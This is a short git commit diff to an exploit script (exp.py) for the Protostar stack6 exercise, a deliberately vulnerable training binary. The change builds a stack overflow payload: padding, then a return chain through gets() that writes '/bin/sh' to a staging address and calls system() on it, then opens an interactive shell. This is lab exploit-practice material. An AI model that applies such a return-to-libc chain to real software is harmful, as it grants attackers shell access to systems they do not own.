17d22ce92dbceb60870c33094fa04df04fb0fcd6
Seas0n <306443228@qq.com>
2016-07-19 21:14:31 +0800

    stack 6

--- protostar/stack6/exp.py
+++ protostar/stack6/exp.py
@@ -6,11 +6,19 @@ io      = zio(target, print_read = c_read, print_write = c_write, timeout = 1000
 io.gdb_hint([0x080484f9])
 
 adr_system  = 0x8049708
+plt_gets    = 0x08048380
+p_ret       = 0x08048453
+adr_stage   = 0x08049000
 
 payload1    = 'A' * 80
+payload1    += l32(plt_gets)
+payload1    += l32(p_ret)
+payload1    += l32(adr_stage)
 payload1    += l32(adr_system)
+payload1    += l32(adr_stage)
 
 io.read_until("input path please:")
 io.writeline(payload1)
+io.writeline('/bin/sh\x00')
 
 io.interact()
